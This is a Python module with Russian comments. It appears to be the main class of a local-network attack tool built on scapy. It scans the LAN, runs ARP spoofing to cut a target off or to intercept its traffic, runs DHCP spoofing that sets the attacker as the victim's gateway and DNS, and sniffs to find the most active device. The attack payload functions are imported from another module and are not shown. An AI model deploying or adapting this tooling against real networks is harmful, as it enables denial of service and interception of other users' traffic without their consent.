"""
NetworkTool — главный класс, собирающий все модули вместе.

Публичный API:
- update_devices() — ARP-сканирование сети
- attack(ip, mac) — ARP-spoof (обрыв связи)
- start_monitor(ip, mac) — ARP-spoof + перехват
- start_dhcp_spoof(ip, mac) — DHCP-spoof (обход статического ARP)
- stop() — остановка всего
- find_noisy_guy() — поиск самого активного устройства
"""

from __future__ import annotations

import os
import socket
import subprocess
import time
from collections import Counter
from threading import Thread
from typing import Callable, Optional

import ctypes

from scapy.all import conf
from scapy.arch import get_if_addr
from scapy.layers.inet import IP
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import srp, sniff

from core.vendor import VendorResolver
from core.forwarding import toggle_forwarding
from core.attack import (
    start_attack_process,
    start_monitor_process,
    start_dhcp_process,
    stop_dhcp_spoof,
)


class NetworkTool:
    """
    Основной класс для сканирования сети, ARP-спуфинга и мониторинга.

    Usage:
        tool = NetworkTool()
        tool.update_devices()
        tool.attack(ip, mac)
        tool.start_monitor(ip, mac)
        tool.start_dhcp_spoof(ip, mac)
        tool.stop()
    """

    def __init__(self) -> None:
        self.my_ip: str = get_if_addr(conf.iface)
        self.my_mac: str = conf.iface.mac
        self.router_ip: str = self._get_gateway_ip()
        self.router_mac: str = self._get_mac(self.router_ip) or "00:00:00:00:00:00"

        parts = self.my_ip.rsplit(".", 1)
        self.network_range: str = (
            f"{parts[0]}.0/24" if len(parts) == 2 else "192.168.0.0/24"
        )

        self.vendor_resolver = VendorResolver()

        # Runtime state
        self.is_attacking: bool = False
        self.target_info: dict = {
            "ip": None,
            "mac": None,
            "name": None,
            "packets": 0,
            "os": None,
            "model": None,
        }
        self.found_devices: list[dict] = []
        self.query_log: list[str] = []

        # External callbacks (set by GUI)
        self.on_attack_log: Optional[Callable[[str], None]] = None
        self.on_monitor_log: Optional[Callable[[str], None]] = None

    # ------------------------------------------------------------------
    # Private helpers
    # ------------------------------------------------------------------

    def _log_attack(self, msg: str) -> None:
        if self.on_attack_log:
            self.on_attack_log(msg)
        else:
            print(f"[ATTACK] {msg}")

    def _log_monitor(self, msg: str) -> None:
        if self.on_monitor_log:
            self.on_monitor_log(msg)
        else:
            print(f"[MONITOR] {msg}")

    # ------------------------------------------------------------------
    def _get_gateway_ip(self) -> str:
        """Определить IP шлюза через route print."""
        if os.name != "nt":
            return "192.168.0.1"
        try:
            result = subprocess.run(
                ["route", "print", "0.0.0.0"],
                capture_output=True, text=True, timeout=5,
            )
            for line in result.stdout.splitlines():
                if "0.0.0.0" in line and "mask" not in line.lower():
                    parts = line.split()
                    if len(parts) >= 3 and parts[2] != "On-link":
                        return parts[2]
        except (subprocess.TimeoutExpired, OSError):
            pass
        return "192.168.0.1"

    # ------------------------------------------------------------------
    def _get_mac(self, ip: str) -> Optional[str]:
        """Получить MAC-адрес по IP через ARP."""
        if not ip:
            return None
        try:
            ans = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                timeout=2, retry=2, verbose=0,
            )[0]
            return ans[0][1].hwsrc if ans else None
        except Exception:
            return None

    # ------------------------------------------------------------------
    def _clear_arp(self) -> None:
        """Восстановить ARP-таблицу после атаки."""
        if not self.target_info.get("ip"):
            return
        try:
            restore_to_target = (
                Ether(dst=self.target_info["mac"])
                / ARP(op=2, pdst=self.target_info["ip"],
                      hwdst=self.target_info["mac"],
                      psrc=self.router_ip, hwsrc=self.router_mac)
            )
            restore_to_router = (
                Ether(dst=self.router_mac)
                / ARP(op=2, pdst=self.router_ip,
                      hwdst=self.router_mac,
                      psrc=self.target_info["ip"],
                      hwsrc=self.target_info["mac"])
            )
            from scapy.sendrecv import sendp
            sendp(restore_to_target, verbose=False)
            sendp(restore_to_router, verbose=False)
        except Exception:
            pass

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def update_devices(self) -> None:
        """Сканировать сеть и обновить список устройств."""
        try:
            ans = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.network_range),
                timeout=3, retry=2, verbose=0,
            )[0]
        except Exception as exc:
            self._log_monitor(f"[!] Ошибка сканирования: {exc}")
            return

        devs: list[dict] = []
        for _, r in ans:
            ip = r.psrc
            if ip in (self.my_ip, self.router_ip):
                continue

            name: str = "Unknown Device"
            try:
                name = socket.gethostbyaddr(ip)[0]
            except (socket.herror, socket.gaierror):
                pass

            if name == "Unknown Device":
                name = self.vendor_resolver.resolve(r.hwsrc)

            devs.append({"ip": ip, "mac": r.hwsrc, "name": name})

        self.found_devices = devs

    # ------------------------------------------------------------------
    def find_noisy_guy(self, duration: int = 7) -> Optional[str]:
        """Найти самое активное устройство по числу пакетов."""
        counts: Counter = Counter()

        def _count(pkt) -> None:
            if pkt.haslayer(IP):
                src = pkt[IP].src
                if src not in (self.my_ip, self.router_ip):
                    counts[src] += 1

        try:
            sniff(prn=_count, timeout=duration)
        except Exception:
            return None

        return counts.most_common(1)[0][0] if counts else None

    # ------------------------------------------------------------------
    # Attack methods
    # ------------------------------------------------------------------

    def attack(self, ip: str, mac: str) -> None:
        """Запустить ARP-spoof атаку (без мониторинга)."""
        self.is_attacking = False
        time.sleep(0.2)
        self.target_info.update({
            "ip": ip, "mac": mac, "name": "", "packets": 0,
            "os": None, "model": None,
        })
        self.query_log.clear()
        self.is_attacking = True

        Thread(
            target=start_attack_process,
            args=(
                lambda: self.is_attacking,
                self.target_info,
                self.router_ip, self.router_mac,
                self.my_ip, self.my_mac,
                self.on_attack_log, self.on_monitor_log,
            ),
            daemon=True,
        ).start()

    # ------------------------------------------------------------------
    def start_monitor(self, ip: str, mac: str) -> None:
        """Запустить ARP-spoof + перехват трафика."""
        self.is_attacking = False
        time.sleep(0.2)
        self.target_info.update({
            "ip": ip, "mac": mac, "name": "", "packets": 0,
            "os": None, "model": None,
        })
        self.query_log.clear()
        self.is_attacking = True

        Thread(
            target=start_monitor_process,
            args=(
                lambda: self.is_attacking,
                self.target_info,
                self.found_devices,
                self.query_log,
                self.router_ip, self.router_mac,
                self.my_ip, self.my_mac,
                self.on_attack_log, self.on_monitor_log,
            ),
            daemon=True,
        ).start()

    # ------------------------------------------------------------------
    def start_dhcp_spoof(self, ip: str, mac: str) -> None:
        """Запустить DHCP-spoof (обход статического ARP)."""
        self.is_attacking = False
        time.sleep(0.2)
        self.target_info.update({
            "ip": ip, "mac": mac, "name": "", "packets": 0,
            "os": None, "model": None,
        })
        self.query_log.clear()
        self.is_attacking = True

        self._log_attack(
            f"[*] DHCP SPOOF: Запущен DHCP-сервер для {ip}"
        )
        self._log_attack(
            f"    Буду выдавать Gateway={self.my_ip}, DNS={self.my_ip}"
        )

        Thread(
            target=start_dhcp_process,
            args=(
                lambda: self.is_attacking,
                self.target_info,
                self.router_ip, self.router_mac,
                self.my_ip, self.my_mac,
                self.on_attack_log, self.on_monitor_log,
            ),
            daemon=True,
        ).start()

    # ------------------------------------------------------------------
    def stop(self) -> None:
        """Остановить все атаки и восстановить сеть."""
        self.is_attacking = False

        # Восстанавливаем DHCP, если был запущен
        stop_dhcp_spoof(
            self.router_ip, self.router_mac,
            self.target_info, self.on_attack_log,
        )

        # Восстанавливаем ARP
        self._clear_arp()
        toggle_forwarding(False)

        self.target_info.update({
            "ip": None, "mac": None, "name": None,
            "packets": 0, "os": None, "model": None,
        })

    # ------------------------------------------------------------------
    def __repr__(self) -> str:
        return (
            f"NetworkTool(ip={self.my_ip}, gw={self.router_ip}, "
            f"devices={len(self.found_devices)})"
        )